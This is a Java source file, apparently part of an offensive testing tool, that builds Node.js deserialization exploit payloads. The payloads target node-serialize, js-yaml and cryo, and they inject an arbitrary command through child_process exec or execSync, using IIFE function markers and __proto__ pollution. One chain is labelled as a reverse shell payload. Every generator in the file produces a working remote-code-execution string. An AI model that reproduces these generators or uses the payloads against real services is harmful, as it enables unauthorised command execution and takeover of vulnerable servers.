package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Node.js deserialization payload generators.
 *
 * JSON string payloads targeting node-serialize, js-yaml, and cryo libraries.
 */
public final class NodePayloads {

    private NodePayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();
        chains.put("NodeSerialize", "node-serialize IIFE RCE via _$$ND_FUNC$$_");
        chains.put("NodeSerializeReverse", "node-serialize reverse shell payload");
        chains.put("JsYamlExploit", "js-yaml !!js/function exploit");
        chains.put("CryoRCE", "cryo library RCE via __proto__ pollution");
        chains.put("FuncSerialization", "Generic function serialization IIFE");
        return chains;
    }

    public static byte[] generate(String chain, String command) {
        String payload = switch (chain) {
            case "NodeSerialize"        -> generateNodeSerialize(command);
            case "NodeSerializeReverse" -> generateNodeSerializeReverse(command);
            case "JsYamlExploit"        -> generateJsYamlExploit(command);
            case "CryoRCE"             -> generateCryoRce(command);
            case "FuncSerialization"    -> generateFuncSerialization(command);
            default -> throw new IllegalArgumentException("Unknown Node.js chain: " + chain);
        };
        return payload.getBytes(StandardCharsets.UTF_8);
    }

    private static String generateNodeSerialize(String command) {
        String escapedCmd = escapeJs(command);
        return "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('" +
                escapedCmd + "')}()\"}";
    }

    private static String generateNodeSerializeReverse(String command) {
        String escapedCmd = escapeJs(command);
        return "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('" +
                escapedCmd + "',function(e,o,s){});}()\"}";
    }

    private static String generateJsYamlExploit(String command) {
        return "\"toString\": !<tag:yaml.org,2002:js/function> \"function(){" +
                "var exec=require('child_process').execSync;" +
                "exec('" + escapeJs(command) + "');}\"";
    }

    private static String generateCryoRce(String command) {
        String escapedCmd = escapeJs(command);
        return "{\"root\":\"_CRYO_REF_1\"," +
                "\"references\":[" +
                "{\"contents\":{\"__proto__\":{\"toString\":{" +
                "\"__cryo_type__\":\"function\"," +
                "\"value\":\"function(){var e=require('child_process').execSync('" +
                escapedCmd + "');return e.toString();}\"" +
                "}}},\"__cryo_type__\":\"object\"}" +
                "]}";
    }

    private static String generateFuncSerialization(String command) {
        String escapedCmd = escapeJs(command);
        return "{\"__proto__\":{\"toString\":" +
                "\"_$$ND_FUNC$$_function(){return require('child_process').execSync('" +
                escapedCmd + "').toString();}()\"}}";
    }

    private static String escapeJs(String s) {
        return s.replace("\\", "\\\\")
                .replace("'", "\\'")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r");
    }
}
